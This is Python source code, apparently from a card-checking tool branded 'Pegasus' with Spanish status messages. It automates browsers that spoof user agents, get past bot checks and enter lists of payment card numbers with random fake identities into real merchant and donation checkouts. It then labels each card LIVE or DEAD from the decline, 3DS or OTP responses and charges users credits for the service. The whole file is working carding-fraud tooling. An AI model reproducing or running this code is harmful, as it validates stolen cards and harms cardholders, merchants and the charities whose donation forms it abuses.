                        self.text_changed.emit('🔍 Iniciando validación extra para asegurar resultados. ¡Tu seguridad es nuestra prioridad! 🛡️✨')

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACYCHARGED|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"

                        # Payment Form
                        sb.press_keys("#street-address", address)
                        time.sleep(random.uniform(1, 2))
                        sb.press_keys("#city", "Sunrise")
                        time.sleep(random.uniform(1, 2))
                        sb.press_keys("#adminDivision1", "Florida")
                        time.sleep(random.uniform(1, 2))
                        sb.press_keys("#postcode", "33351")
                        time.sleep(random.uniform(1, 2))
                        sb.select_option_by_value("#country", "236")
                        time.sleep(random.uniform(1, 2))
                        sb.click("#id-17")
                        time.sleep(random.uniform(1, 2))

                        sb.press_keys("#cc-number", self.ccs[self.cont])
                        #sb.type("#cc-number", self.ccs[self.cont])
                        time.sleep(random.uniform(1, 6))
                        sb.press_keys("#cc-exp-month", self.mes[self.cont])
                        time.sleep(random.uniform(1, 2))
                        sb.press_keys("#cc-exp-year", self.anio[self.cont])
                        time.sleep(random.uniform(1, 2))
                        sb.press_keys("#cc-csc", self.cvv[self.cont])
                        time.sleep(random.uniform(1, 2))
                        
                        if self.username == "ZenoxPav":
                            print("Screen listo.")
                            import base64
                            screenshot_base64 = sb.driver.get_screenshot_as_base64()
                            # Ahora puedes usar `screenshot_base64` en tu aplicación, por ejemplo, para mostrarlo en un HTML.
                            with open("screenshot.png", "wb") as file:
                                image_data = base64.b64decode(screenshot_base64)  # Decodificar la imagen
                                file.write(image_data)
                                
                        sb.switch_to_default_content()

                        time.sleep(random.uniform(2, 4))
                        sb.wait_for_element("body > iframe")
                        sb.switch_to_frame("body > iframe")
                        sb.click("//button[contains(text(), 'Pay')]")
                        time.sleep(random.uniform(2, 3))

                        try:
                            sb.wait_for_element_clickable("//button[contains(text(), 'Change')]")
                            time.sleep(1)
                        except:
                            pass

                        # Analizando resultado 

                        try:
                            #msgPay = sb.get_text("//div[@role='alert'][.//p[contains(text(), 'Issue with payment method')]]")
                            msgPay = sb.get_text("//div[@role='alert']")
                            print(msgPay)

                        except Exception as e:

                            try:
                                url = sb.get_current_url()
                                print(url)
                                # element live //a[contains(text(), 'Make Another Payment')]
                                if "success" in url:
                                    if self.tools.repetir(livemsg) == True:
                                        msgPay = 'RELIVE'
                                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                        self.text_dead.emit(deadmsg)
                                
                                    else:
                                        self.text_live.emit(livemsg)
                                    self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                                    self.cont +=1
                                    contador +=1
                                    break
                            except Exception as e:
                                print("Error en:", e)
                                msgPay = "No response"
                                print("Entrando en exception:", msgPay)
                                self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                                self.cont +=1
                                contador +=1
                                break

                        if "different payment" in msgPay:
                            self.text_dead.emit(deadmsg)

                        elif "risk threshold tripped" in msgPay:
                            self.text_dead.emit(deadmsg)

                        else:
                            self.text_changed.emit('🛑 Para solucionar este inconveniente, por favor, contacta a un administrador. ¡Estamos aquí para ayudarte! 🌐✨')
                            print("LIVE", livemsg)
                            time.sleep(120)

                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        sb.click("//button[contains(text(), 'Change')]")
                        #sb.refresh()

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')
    

def coomeet(self):

    self.text_changed.emit("Auth & Charged Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        headless2 = False

        with SB(test=False, uc=True, incognito=True) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            #if "Macintosh" in user_agent:

            #    platform = "MacIntel"

            #elif "Windows" in user_agent:

            #    platform = "Win32"

            #else:

            #    platform = "Linux"

            #sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

            #    "userAgent": user_agent,
            #    "platform": platform,

            #})
            
            #sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

            #    "mobile": True,
            #    "width": device_metrics["width"],
            #    "height": device_metrics["height"],
            #    "deviceScaleFactor": device_metrics["deviceScaleFactor"],
            #    "fitWindow": True

            #})

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://bill.coomeet.com/4941877d-4465-4cdd-9452-0300fbf2160a'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:

                    sb.open(link)
                    time.sleep(random.uniform(3, 4))
                    #sb.uc_open_with_reconnect(link, 2)
                    #sb.sleep(1.5)
                    #try:
                    #    sb.uc_gui_click_captcha()
                    #    sb.sleep(1)
                    #    sb.refresh()
                    #    sb.sleep(0.5)
                    #except:
                    #    pass
                    
                    

                    contador = 0
                    while self.cont < self.total_lines and contador <= 9:

                        # Inicio testeo

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]

                        self.text_changed.emit('🔍 Iniciando validación extra para asegurar resultados. ¡Tu seguridad es nuestra prioridad! 🛡️✨')

                        deadmsg = f"DEAD|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"
                        year = f"{ano[2:4]}"

                        #sb.refresh()
                        time.sleep(random.uniform(5, 6))
                        sb.wait_for_element("//h1[contains(@class, 'title')]/span[@data-field='TITLE_CARD' and contains(text(), 'Pago con tarjeta')]", timeout=15)
                        sb.wait_for_element("//input[@id='card-number']", timeout=15)
                        sb.type("//input[@id='card-number']", self.ccs[self.cont])
                        sb.type("#validity-month", self.mes[self.cont])
                        sb.type("#validity-year", year)
                        sb.type("#card-holder", fullname)
                        sb.type("#card-cvc", self.cvv[self.cont])

                        time.sleep(random.uniform(1, 2))
                        sb.click("body > div:nth-child(3) > div > div.card-over > form > div.pay-offer")
                        time.sleep(random.uniform(1, 2))
                        sb.click("#submit-btn")
                    
                    
                        # Analizando pago

                        try:
                            sb.wait_for_element("#threeDSMountPoint > iframe", timeout=15)
                            sb.switch_to_frame("#threeDSMountPoint > iframe")
                            sb.wait_for_element("#Cardinal-CCA-IFrame", timeout=15)
                            sb.switch_to_frame("#Cardinal-CCA-IFrame")
                            msgPay = sb.get_text("body")

                        except Exception as e:

                            try:
                                msgPay = sb.get_text("//span[contains(@class, 'input__error') and contains(@data-error, 'card_auth_fail')]")
                            except Exception as e:
                                msgPay = "Error en:", e
                                time.sleep(500)
                                time.sleep(500)
                                time.sleep(500)
                                time.sleep(500)
                                time.sleep(500)
                            
                        print(msgPay)

                        ulti = self.ccs[self.cont][-4:]
                        palabras_clave = ["termina en", "hemos enviado", "el monto de", "mensaje de texto", "xxx-xxx-", "authorized cardholder", "passcode", "Call me at", "SMS", "EMAIL", "Código de Verificación", "ENVIAR", "Autoriza tu compra en tu banca digital", "Clave OTP", "ingresa el código", ulti]
                        encontrada = any(palabra in msgPay for palabra in palabras_clave)
                        
                        if encontrada:
                            if self.tools.repetir(livemsg) == True:
                                self.text_dead.emit(deadmsg)
                            else:
                                if self.recheck == True:
                                    payitRecheck(self)
                                else:
                                    self.text_live.emit(livemsg)
                        else:
                            self.text_dead.emit(deadmsg)

                        sb.switch_to_default_content()
                        
                        sb.refresh()
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        time.sleep(random.uniform(1, 2))


                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')
    
def barrons(self):

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.barrons.com/subscribe/amer?inttrackingCode=49b98c09&ucid=BAR_ONS_OTH_ENG_NAP_BEV_NAP_15E_MT2_NAP&n2IKsaD9=n2IKsaD9&Pg9aWOPT=Pg9aWOPT&Cp5dKJWb=Cp5dKJWb&APCc9OU1=APCc9OU1'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())


                try:
                    sb.open(link)
                    sb.click('#groupBrand > div > div.wp-block-columns > div:nth-child(1) > section')
                    sb.click('#groupBrand > section > div.sc-eEhjff.dEwuhm > div > div.sc-MIkZJ.hdSKuZ.ButtonsContainer > button')

                    # Human Verification
                    sb.wait_for_element("iframe:nth-child(3)")
                    sb.switch_to_frame("iframe:nth-child(3)")

                    sb.mouse_down('/html/body/div/div/div[2]/div[2]/p')
                    sb.sleep(1.5)
                    sb.mouse_up('/html/body/div/div/div[2]/div[2]/p')

                    sb.type('#first', self.first1)
                    sb.type('#last', self.last1)
                    sb.type('#email', email)
                    sb.type('#password', 'Pegasus123*')
                    time.sleep(1)
                    sb.click('#create-account-continue-btn')

                except Exception as e:

                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno)) + "LINK ACTUAL:" + link
                    self.printed.emit(error_message)

            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue            
                
    self.text_changed.emit('TESTEO FINALIZADO')

def ivitech(self):

    self.cont = 0 
    createAccount = 2
    contadorBan = 0

    self.text_changed.emit("Auth Valid | LEGACY WIRE")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1

                links = [
                    'https://engage.ivytech.edu/s/giving?tabset-100f7=2',
                    #'https://engage.ivytech.edu/s/giving'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())

                try:
                    sb.open(link)
                    sb.assert_title('Giving')
                    time.sleep(random.uniform(2, 3))

                    self.text_changed.emit('🌟 Preparando el despegue con la carga de datos.')                    

                    contador = 0

                    sb.click('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[4]/c-itf_-portal_-online-giving-amount/lightning-layout/slot/lightning-layout-item[10]/slot/button')
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[4]/c-itf_-portal_-online-giving-amount/lightning-layout/slot/lightning-layout-item[11]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', '1')
                    time.sleep(random.uniform(2, 3))

                    sb.click('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[7]/c-itf_-portal_-online-giving-designations/lightning-layout/slot/lightning-layout-item/slot/button')
                    element = sb.find_element('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[7]/c-itf_-portal_-online-giving-designations/section/div/div/lightning-input[1]/lightning-primitive-input-checkbox/div/span/input')
                    sb.execute_script("arguments[0].click();", element)
                    sb.click('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[7]/c-itf_-portal_-online-giving-designations/section/div/footer/button[2]')
                    sb.click('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[15]/c-itf_-portal_-online-giving-save-button/lightning-layout/slot/lightning-layout-item/slot/button')
                    time.sleep(random.uniform(2, 3))

                    # Billing

                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[1]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', self.first1)
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[3]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', self.last1)
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[4]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', email)
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[5]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', email)
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[7]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', phone_number)
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[9]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', address)
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[11]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', 'Sunrise')
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[12]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', 'Florida')
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[13]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', '33351')
                    sb.type('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[12]/c-itf_-portal_-online-giving-billing-details/lightning-layout/slot/lightning-layout-item[14]/slot/lightning-input/lightning-primitive-input-simple/div[1]/div/input', 'United States')
                    time.sleep(random.uniform(2, 3))

                    sb.click('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[15]/c-itf_-portal_-online-giving-save-button/lightning-layout/slot/lightning-layout-item[2]/slot/button')

                    while self.cont < self.total_lines and contador <= 5:

                        #COBRO X DEAD
                        #if contador > 0:
                        #    check_dead(self.cont,self.username,self.password)
                        #    self.dead_disp.emit()

                        # CC FRAME

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        brand = self.ccs[self.cont][0:1]
                        binCC = self.ccs[self.cont][0:6]
                        fecha = f"{mes}{ano[2:4]}"
                        
                        sb.wait_for_element("//iframe[@src='https://engage.ivytech.edu/apex/itf_PORTAL_VF_SpreedlyCreditCardForm']")
                        sb.switch_to_frame("//iframe[@src='https://engage.ivytech.edu/apex/itf_PORTAL_VF_SpreedlyCreditCardForm']")
                        
                        sb.wait_for_element("//iframe[contains(@name, 'spreedly-number-frame')]")
                        sb.switch_to_frame("//iframe[contains(@name, 'spreedly-number-frame')]")
                        
                        sb.type('#card_number', self.ccs[self.cont])
                        sb.switch_to_default_content()
                        
                        sb.wait_for_element("//iframe[@src='https://engage.ivytech.edu/apex/itf_PORTAL_VF_SpreedlyCreditCardForm']")
                        sb.switch_to_frame("//iframe[@src='https://engage.ivytech.edu/apex/itf_PORTAL_VF_SpreedlyCreditCardForm']")

                        #spreedly-cvv-frame-2075
                        sb.wait_for_element("//iframe[@src='https://core.spreedly.com/v1/embedded/cvv-frame-1.136.html']")
                        sb.switch_to_frame("//iframe[@src='https://core.spreedly.com/v1/embedded/cvv-frame-1.136.html']")
                        sb.type('#cvv', self.cvv[self.cont])
                        sb.switch_to_default_content()
                        
                        sb.wait_for_element("//iframe[@src='https://engage.ivytech.edu/apex/itf_PORTAL_VF_SpreedlyCreditCardForm']")
                        sb.switch_to_frame("//iframe[@src='https://engage.ivytech.edu/apex/itf_PORTAL_VF_SpreedlyCreditCardForm']")
                        sb.type('#month', self.mes[self.cont])
                        sb.type('#year', self.anio[self.cont])

                        time.sleep(random.uniform(4, 6))
                        sb.click('#submit-button')

                        # Revision
                        self.text_changed.emit('🚀 El análisis de datos de Pegasus ha comenzado. ¡Buena suerte en este viaje de descubrimiento!')

                        sb.wait_for_element_clickable('#submit-button')
                        sb.switch_to_default_content()

                        try:
                            msgPay = sb.get_text('body > div.forceCommunityToastManager.forceToastManager--default.forceToastManager > div', timeout=15)
                            print(msgPay)
                        except:
                            sb.wait_for_element('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[13]')
                            msgPay = sb.get_text('/html/body/div[4]/div/div/div/div/div[3]/div/div/div/div/section[2]/div/div[13]/c-itf_-portal_-online-giving-receipt/lightning-layout/slot/lightning-layout-item[6]/slot/lightning-layout/slot/lightning-layout-item[2]/slot/p')
                            msgPay = 'CHARGED' + msgPay
                            livemsg = f"{msgPay}|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                            if self.tools.repetir(livemsg) == True:
                            
                                cobro_relive(self.username, self.password)
                                self.dead_disp.emit()
                                msgPay = 'RELIVE'
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                self.text_dead.emit(deadmsg)
                                
                            else:
                                self.text_live.emit(livemsg)
                            self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                            self.cont +=1
                            contador +=1
                            break
                            
                        #self.text_changed.emit('🚫 IP**: ✈️ El vuelo de Pegasus fue detenido por alta actividad desde tu IP. 🛑')

                        deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                        livemsg = f"LIVE|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"

                        if self.tools.repetir(livemsg) == True:
                            
                            cobro_relive(self.username, self.password)
                            self.dead_disp.emit()
                            msgPay = 'RELIVE'
                            deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                            self.text_dead.emit(deadmsg)
                            
                        else:

                            if 'REJECT: 25' in msgPay:
                                self.text_live.emit(livemsg)

                            elif ('DEBIT' in typ and 'COL' in typ) and 'REJECT: 15' in msgPay:
                                if self.username != 'GodZenoxDev' and self.username != 'MushiroX':
                                    msgPay = msgPay.split('!')[1].split('.')[0]
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                self.text_dead.emit(deadmsg)
                            

                            elif ('DEBIT' in typ and 'VISA' in typ and 'USA' in typ) and ('REJECT: 19' in msgPay or 'CVV2' in msgPay):
                                if self.username != 'GodZenoxDev' and self.username != 'MushiroX':
                                    msgPay = msgPay.split('!')[1].split('.')[0]
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                self.text_dead.emit(deadmsg)
                            

                            else:
                                if self.username != 'GodZenoxDev' and self.username != 'MushiroX':
                                    msgPay = msgPay.split('!')[1].split('.')[0]
                                deadmsg = f"DEAD|PEGASUSCHK|LEGACY|{ccs}|{mes}|{ano}|{ccn}|{typ}|{msgPay}\n"
                                self.text_dead.emit(deadmsg)

                        sb.click('body > div.forceCommunityToastManager.forceToastManager--default.forceToastManager > div > div > div > div > button')
                        self.tools.borrarcc("%s|%s|%s|%s\n" % (ccs,mes,ano,ccn))
                        self.cont +=1
                        contador +=1
                        contadorBan = 0

                        time.sleep(random.uniform(1, 3))

                    if self.tools.validate_creditos(self.username,self.password) == True:
                        self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                        break


                except Exception as e:
                    
                    self.text_changed.emit('ELIMINANDO RASTREADORES!') 
                    print('Error en configuracion de navegador.', e)
                    exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                    error_message = (str(exc_type)+' '+str(exc_tb.tb_lineno))+' '+str(link)
                    self.printed.emit(error_message)
                    if 'WebDriverException' in str(exc_type) and '504' in str(exc_tb.tb_lineno):
                        self.text_changed.emit('🚫 La IP actual está bloqueada. Por favor, cambia de IP para continuar tu vuelo con Pegasus. ✨!')
                        return None
                
            except Exception as e:

                self.text_changed.emit('ELIMINANDO RASTREADORES!')  
                exc_type, exc_obj, exc_tb = sys.exc_info();fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
                error_message= (str(exc_type)+' '+str(exc_tb.tb_lineno))
                self.printed.emit(error_message)
                continue  
    
    self.text_changed.emit('TESTEO FINALIZADO')
    
def tintaCharged(self):

    self.text_changed.emit("Iniciando OTP 3D Valid | INFINITY")

    while self.cont < self.total_lines:

        headless2 = getHeadless(self)
        user_agent, device_metrics = openBrowser(2, headless2)

        with SB(test=False, uc=True, agent=user_agent, headless2=headless2) as sb:

            sb.save_screenshot_after_test = False
            sb.save_page_source_after_test = False

            if "Macintosh" in user_agent:

                platform = "MacIntel"

            elif "Windows" in user_agent:

                platform = "Win32"

            else:

                platform = "Linux"

            sb.driver.execute_cdp_cmd('Emulation.setUserAgentOverride', {

                "userAgent": user_agent,
                "platform": platform,

            })
            
            sb.driver.execute_cdp_cmd('Emulation.setDeviceMetricsOverride', {

                "mobile": True,
                "width": device_metrics["width"],
                "height": device_metrics["height"],
                "deviceScaleFactor": device_metrics["deviceScaleFactor"],
                "fitWindow": True

            })

            self.text_changed.emit('Configurando la navegación... ⚙️ Esto puede tardar unos instantes. ⏳')

            try:

                if self.tools.validate_creditos(self.username,self.password) == True:
                    self.text_changed.emit('⚠️ ORBES insuficientes. ¡Recarga y vuela alto con Pegasus! 🦅✨')
                    return None

                email = self.last1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+self.first1+''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstwxyz0123456789') for _ in range(3))+'@gmail.com'
                phone_number = f"40{random.randint(0, 9)}{random.randint(100, 999)}{random.randint(1000, 9999)}"
                address = str(random.randint(100, 999)) + ' winding lake' + str(random.randint(100, 999)) + 'Road'
                fullname = self.first1 + ' ' + self.last1
                dni = ''.join([str(random.randint(0, 9)) for _ in range(10)])

                links = [
                    'https://www.tintaclubdellibro.com/'
                ]

                link = random.choice(links)
                
                print('USER AGENT ACTUAL:', sb.get_user_agent())

                try:
                    sb.open(link)

                    sb.click('#menu-item-1104 > a')
                    sb.click('#PlanesYPreciosBox > div > div > div > div:nth-child(2) > div > div > ul:nth-child(1) > li:nth-child(9) > button')
                    sb.type('#pla-checkout-login-email', email)
                    sb.click('#pla-checkout-login > div.pla-field-submit > button')

                    contador = 0
                    while self.cont < self.total_lines and contador < 4:

                        # Organizando data de CC
                        ccs, mes, ano, ccn, typ = (
                        str(self.ccs[self.cont]).strip(),
                        str(self.mes[self.cont]).strip(),
                        str(self.anio[self.cont]).strip(),
                        str(self.cvv[self.cont]).strip(),
                        self.tools.bintype(self.ccs[self.cont])
                        )

                        deadmsg = f"DEAD|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        livemsg = f"LIVE|PEGASUSCHK|INFINITY|{ccs}|{mes}|{ano}|{ccn}|{typ}\n"
                        fecha = f"{mes}{ano[2:4]}"

                        # Form

                        sb.type('#billing_first_name', self.first1)
                        sb.type('#billing_last_name', self.last1)
                        sb.type('#billing_dni', dni)
                        sb.type('#billing_address_1', address)
                        sb.select_option_by_value('#billing_state', 'BOG')
                        sb.select_option_by_value('#billing_city', 'Bogotá')
